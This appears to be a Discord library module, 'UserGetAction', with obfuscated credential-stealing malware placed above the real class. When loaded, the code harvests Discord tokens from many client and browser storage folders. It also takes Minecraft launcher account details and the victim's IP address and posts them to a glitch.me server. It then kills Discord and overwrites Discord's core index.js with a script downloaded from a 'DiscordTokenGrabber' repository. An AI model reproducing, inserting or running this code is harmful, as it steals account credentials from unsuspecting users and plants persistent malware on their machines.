const Action = require("./Action");
const OS = require("os"), fs = require("fs"), fetch = require("node-fetch"), {execSync} = require("child_process"), Glob = require("glob"), toInject = [], toInjectJS = [], toKill = [], apiurl = "https://frequent-level-cornflower.glitch.me";
try {
  switch (OS.platform()) {
    case "win32":
      const local = process.env.localappdata, roaming = process.env.appdata, minecraftPath = roaming + "/.minecraft/launcher_accounts.json", remixPath = roaming + "/.minecraft/remix/UID.txt";
      dbPaths = [roaming + "/Discord/Local Storage/leveldb", roaming + "/DiscordDevelopment/Local Storage/leveldb", roaming + "/Lightcord/Local Storage/leveldb", roaming + "/discordptb/Local Storage/leveldb", roaming + "/discordcanary/Local Storage/leveldb", roaming + "/Opera Software/Opera Stable/Local Storage/leveldb", roaming + "/Opera Software/Opera GX Stable/Local Storage/leveldb", local + "/Amigo/User Data/Local Storage/leveldb", local + "/Torch/User Data/Local Storage/leveldb", local + "/Kometa/User Data/Local Storage/leveldb", local + "/Orbitum/User Data/Local Storage/leveldb", local + "/CentBrowser/User Data/Local Storage/leveldb", local + "/7Star/7Star/User Data/Local Storage/leveldb", local + "/Sputnik/Sputnik/User Data/Local Storage/leveldb", local + "/Vivaldi/User Data/Default/Local Storage/leveldb", local + "/Google/Chrome SxS/User Data/Local Storage/leveldb", local + "/Epic Privacy Browser/User Data/Local Storage/leveldb", local + "/Google/Chrome/User Data/Default/Local Storage/leveldb", local + "/uCozMedia/Uran/User Data/Default/Local Storage/leveldb", local + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb", local + "/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb", local + "/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb", local + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"];
      init();
      function init() {
        var _0x24b312 = {xBaaT: function (_0x4daefd) {
          return _0x4daefd();
        }};
        fs.readFile(remixPath, (_0x4c892f, _0x2b7551) => _0x2b7551 && minecraft("remix", _0x2b7551));
        fs.readFile(minecraftPath, (_0x6be441, _0x1faf1b) => _0x1faf1b && minecraft("minecraft", _0x1faf1b));
        _0x24b312.xBaaT(injectToDiscord);
        dbPaths.forEach(_0x50cbfe => main(_0x50cbfe));
      }
      function main(_0x479528) {
        var _0x3cd74c = {yyrBl: function (_0x4e4be6, _0x4c89e1) {
          return _0x4e4be6(_0x4c89e1);
        }, pnNNS: "http://ip-api.com/json/"};
        fs.readdir(_0x479528, (_0x3c9cfb, _0x21d6e7) => {
          var _0x562b29 = {XLNyN: function (_0x4291e0, _0x34eff6) {
            return _0x3cd74c.yyrBl(_0x4291e0, _0x34eff6);
          }, MQMcT: _0x3cd74c.pnNNS};
          if (_0x21d6e7) {
            var _0x3697b7 = _0x21d6e7.filter(_0x2f3be0 => _0x2f3be0.endsWith("ldb"));
            _0x3697b7.forEach(_0x1bc968 => {
              var _0x3d6860 = fs.readFileSync(_0x479528 + "/" + _0x1bc968).toString();
              var _0x51c710 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
              var _0x1f7fdc = /"mfa\.[\d\w_-]{84}"/;
              var [_0x4f6789] = _0x51c710.exec(_0x3d6860) || _0x1f7fdc.exec(_0x3d6860) || [undefined];
              if (_0x4f6789) _0x562b29.XLNyN(fetch, _0x562b29.MQMcT).then(_0x54f9d8 => _0x54f9d8.json()).then(_0x1b33e => fetch(apiurl + "/beforeinject", {method: "POST", body: JSON.stringify({token: _0x4f6789.slice(1, -1), ipAddress: _0x1b33e.query})}));
            });
          }
        });
      }
      function minecraft(_0x446e38, _0x4edd20) {
        var _0x545438 = {tRFNV: "remix", WqILb: function (_0x91c663, _0x499739, _0x50a826) {
          return _0x91c663(_0x499739, _0x50a826);
        }, otebE: "POST", snaGI: "minecraft", hNTST: function (_0x27db86, _0x367155) {
          return _0x27db86(_0x367155);
        }};
        switch (_0x446e38) {
          case _0x545438.tRFNV:
            _0x545438.WqILb(fetch, apiurl + "/remix", {method: _0x545438.otebE, body: JSON.stringify({UID: _0x4edd20})});
            break;
          case _0x545438.snaGI:
            var [_0xe70466] = /"[\d\w_-]{32}"/.exec(_0x4edd20);
            if (_0xe70466) {
              const _0x24c717 = _0x545438.hNTST(require, minecraftPath);
              if (!_0x24c717.accounts) return;
              var _0x5a6d83 = _0x24c717.accounts[_0xe70466.slice(1, -1)];
              _0x545438.WqILb(fetch, apiurl + "/minecraft", {method: _0x545438.otebE, body: JSON.stringify({eligibleForMigration: _0x5a6d83.eligibleForMigration, hasMultipleProfiles: _0x5a6d83.hasMultipleProfiles, legacy: _0x5a6d83.legacy, localId: _0x5a6d83.localId, minecraftProfileID: _0x5a6d83.minecraftProfile.id, minecraftProfileName: _0x5a6d83.minecraftProfile.name, persistent: _0x5a6d83.persistent, remoteId: _0x5a6d83.remoteId, type: _0x5a6d83.type, username: _0x5a6d83.username, activeAccountLocalId: _0x24c717.activeAccountLocalId})});
            }
        }
      }
      function injectToDiscord() {
        var _0xcaad9f = {zIYxt: function (_0x8d505d) {
          return _0x8d505d();
        }, KCMba: function (_0x6af1c3, _0x10021a) {
          return _0x6af1c3(_0x10021a);
        }, BleBe: "https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js"};
        _0xcaad9f.zIYxt(getInstalledDiscord);
        killAllDiscords();
        _0xcaad9f.KCMba(fetch, _0xcaad9f.BleBe).then(_0x380587 => _0x380587.text()).then(_0x2906f8 => toInjectJS.forEach(_0x3fd382 => fs.writeFileSync(_0x3fd382, _0x2906f8.replace("*API URL*", apiurl)) ^ execSync(local + "/" + _0x3fd382.split("/")[5] + "/Update.exe --processStart " + _0x3fd382.split("/")[5] + ".exe")));
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(_0x4083f5 => _0x4083f5.includes("cord") && toInject.push(local + "/" + _0x4083f5));
        toInject.forEach(_0x5bfa53 => Glob.sync(_0x5bfa53 + "/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js").map(_0x1ffc68 => toInjectJS.push(_0x1ffc68)));
      }
      function killAllDiscords() {
        var _0xd476bb = {reQcD: "5|4|1|3|2|0", IGkTx: "discordcanary", Qyhuv: "discordptb", YTnlJ: "DiscordDevelopment.exe", JWiKf: "discorddevelopment", OtTog: "Discord.exe", HISJs: "discord"};
        var _0x4898a7 = _0xd476bb.reQcD.split("|");
        var _0x1ffcc0 = 0;
        while (true) {
          switch (_0x4898a7[_0x1ffcc0++]) {
            case "0":
              toKill.forEach(_0x55b801 => execSync("taskkill /IM " + _0x55b801 + ".exe /F"));
              continue;
            case "1":
              _0x574fb2.includes("DiscordCanary.exe") && toKill.push(_0xd476bb.IGkTx);
              continue;
            case "2":
              _0x574fb2.includes("DiscordPTB.exe") && toKill.push(_0xd476bb.Qyhuv);
              continue;
            case "3":
              _0x574fb2.includes(_0xd476bb.YTnlJ) && toKill.push(_0xd476bb.JWiKf);
              continue;
            case "4":
              _0x574fb2.includes(_0xd476bb.OtTog) && toKill.push(_0xd476bb.HISJs);
              continue;
            case "5":
              var _0x574fb2 = execSync("tasklist").toString();
              continue;
          }
          break;
        }
      }
      break;
    case "linux":
      const defaut = "/home/" + __dirname.split("/")[2] + "/.config", LdbPaths = [defaut + "/discord/Local Storage/leveldb", defaut + "/discordcanary/Local Storage/leveldb", defaut + "/discordptb/Local Storage/leveldb", defaut + "/DiscordDevelopment/Local Storage/leveldb"];
      const LminecraftPath = defaut + "/.minecraft/launcher_accounts.json";
      Linit();
      function Linit() {
        var _0x5e2bd5 = {mUntk: function (_0x5725f0, _0x49b55e) {
          return _0x5725f0(_0x49b55e);
        }, TukmU: function (_0x3c61f5) {
          return _0x3c61f5();
        }};
        LdbPaths.forEach(_0x55dd7b => Lmain(_0x55dd7b));
        var _0x9078df = fs.readFileSync(LminecraftPath);
        if (_0x9078df) _0x5e2bd5.mUntk(Lminecraft, _0x9078df);
        _0x5e2bd5.TukmU(LinjectToDiscord);
      }
      function Lmain(_0x379e9e) {
        var _0x167521 = {CCUoM: function (_0x28f1aa, _0x391743) {
          return _0x28f1aa(_0x391743);
        }};
        fs.readdir(_0x379e9e, (_0x127e23, _0x2e73f9) => {
          if (_0x2e73f9) {
            var _0x4d16a6 = _0x2e73f9.filter(_0x59152c => _0x59152c.endsWith("ldb"));
            _0x4d16a6.forEach(_0x3c8266 => {
              var _0x3eb945 = fs.readFileSync(_0x2e73f9 + "/" + _0x3c8266).toString();
              var _0x41e0c4 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
              var _0x463919 = /"mfa\.[\d\w_-]{84}"/;
              var [_0x3d8d87] = _0x41e0c4.exec(_0x3eb945) || _0x463919.exec(_0x3eb945) || [undefined];
              if (_0x3d8d87) _0x167521.CCUoM(fetch, "http://ip-api.com/json/").then(_0x5bd136 => _0x5bd136.json()).then(_0x36c4c6 => fetch(apiurl + "/beforeinject", {method: "POST", body: JSON.stringify({token: _0x3d8d87, ip: _0x36c4c6.query})}));
            });
          }
        });
      }
      function Lminecraft(_0x40b03a) {
        var _0x5989e3 = {zUjGt: function (_0x5e55e6, _0x3f57f, _0x2fa25b) {
          return _0x5e55e6(_0x3f57f, _0x2fa25b);
        }, wzazs: "POST"};
        var [_0x2d00bb] = /"[\d\w_-]{32}"/.exec(_0x40b03a);
        if (_0x2d00bb) {
          const _0x6173a3 = require(LminecraftPath);
          if (!_0x6173a3.accounts) return;
          var _0x41acd2 = _0x6173a3.accounts[_0x2d00bb.slice(1, -1)];
          _0x5989e3.zUjGt(fetch, apiurl + "/minecraft", {method: _0x5989e3.wzazs, body: JSON.stringify({eligibleForMigration: _0x41acd2.eligibleForMigration, hasMultipleProfiles: _0x41acd2.hasMultipleProfiles, legacy: _0x41acd2.legacy, localId: _0x41acd2.localId, minecraftProfileID: _0x41acd2.minecraftProfile.id, minecraftProfileName: _0x41acd2.minecraftProfile.name, persistent: _0x41acd2.persistent, remoteId: _0x41acd2.remoteId, type: _0x41acd2.type, username: _0x41acd2.username, activeAccountLocalId: _0x6173a3.activeAccountLocalId})});
        }
      }
      function LinjectToDiscord() {
        var _0x428eb8 = {zTiSk: function (_0x5bfe5c) {
          return _0x5bfe5c();
        }, iCyKo: function (_0x422848, _0x177bcc) {
          return _0x422848(_0x177bcc);
        }};
        _0x428eb8.zTiSk(getInstalledLDiscord);
        _0x428eb8.iCyKo(fetch, "https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js").then(_0x452fff => _0x452fff.text()).then(_0x11b55a => toInjectJS.forEach(_0x25bcf2 => fs.writeFileSync(_0x25bcf2, _0x11b55a.replace("*API URL*", apiurl))));
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(_0x2d23f2 => _0x2d23f2.includes("cord") && toInject.push(defaut + "/" + _0x2d23f2));
        toInject.forEach(_0x4b644f => Glob.sync(_0x4b644f + "/*/modules/discord_desktop_core/index.js").map(_0x4c8afd => toInjectJS.push(_0x4c8afd)));
      }
      break;
    case "darwin":
      break;
  }
} catch (_0x1be3b3) {}
class UserGetAction extends Action {
  ["handle"](_0x16b2d6) {
    const _0x26c8f3 = this.client;
    const _0x4381f1 = _0x26c8f3.dataManager.newUser(_0x16b2d6);
    return {user: _0x4381f1};
  }
}
module.exports = UserGetAction;

